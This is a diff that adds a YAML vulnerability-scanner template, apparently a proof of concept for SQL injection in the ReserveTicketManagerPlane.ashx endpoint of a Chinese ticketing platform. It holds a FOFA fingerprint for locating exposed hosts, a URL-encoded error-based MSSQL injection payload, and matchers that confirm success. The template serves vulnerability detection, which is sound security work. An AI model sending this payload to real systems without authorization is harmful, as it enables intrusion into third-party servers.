@@ -1,0 +1,18 @@
+id: poc-yaml-zckx-reserveticketmanagerplane-ashx-sqli
+info:
+  name: 中成科信票务管理平台 ReserveTicketManagerPlane.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 中城科信票务管理平台
+  fofa: body="SystemManager/SoftwareLicense.htm"
+requests:
+- method: POST
+  path: /SystemManager/Planetarium/ReserveTicketManagerPlane.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: Method=GetGuideByCode&inputType=20&codeValue=1%27+AND+7821+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%287821%3D7821%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29--+Vjyh
+  expression: status_code == 500 && contains(body,"在将 varchar 值") && contains(body,"转换成数据类型
+    int 时失败") && contains(body,"SqlException")
+variables: {}
+transport: http
